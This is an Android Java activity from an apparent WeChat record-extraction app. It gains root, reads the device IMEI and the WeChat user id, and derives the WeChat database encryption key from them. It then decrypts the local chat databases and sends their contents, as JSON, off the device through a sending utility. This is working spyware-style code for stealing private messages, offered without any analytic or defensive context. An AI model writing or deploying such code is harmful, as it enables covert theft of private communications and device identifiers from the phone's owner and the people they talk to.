package com.wiwj.wxrecord;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.google.gson.Gson;

import net.sqlcipher.database.SQLiteDatabase;

import java.io.File;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private TextView textView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button button = (Button) findViewById(R.id.button);
        textView = (TextView) findViewById(R.id.text1);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //获取微信权限
                WxInfo.getRoot();
                //获取微信的uin
                String uin = WxInfo.initCurrWxUin();
                // 获取 IMEI 唯一识别码
                TelephonyManager phone = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    return;
                }
                String IMEI = phone.getDeviceId();
                // 根据imei和uin生成的md5码，获取数据库的密码（去前七位的小写字母）
                String mDbPassword = WxInfo.initDbPassword(IMEI, uin);
                //  递归查询微信本地数据库文件
                List<File> wxDbFileList = WxInfo.getWxDbFileList();
                //处理多账号登陆情况
                for (int i = 0; i < wxDbFileList.size(); i++) {
                    File file = wxDbFileList.get(i);
                    SQLiteDatabase db = null;
                    try {
                        //链接数据库
                        db = DataQuery.getdb(file, mDbPassword);
                        Object result = DataQuery.getResult(db);
                        Gson gson = new Gson();
                        String res = gson.toJson(result);
                        //发送数据
                        SendDataUtils.sendData(res);
                        LogUtil.i(res);
                        // textView.setText("已发送!");
                    } catch (Exception e) {
                        e.printStackTrace();
                        textView.setText("失败!" + e.getMessage());
                    } finally {
                        if (db != null) {
                            db.close();
                        }
                        textView.setText("已发送!");
                    }
                }
            }
        });
    }
}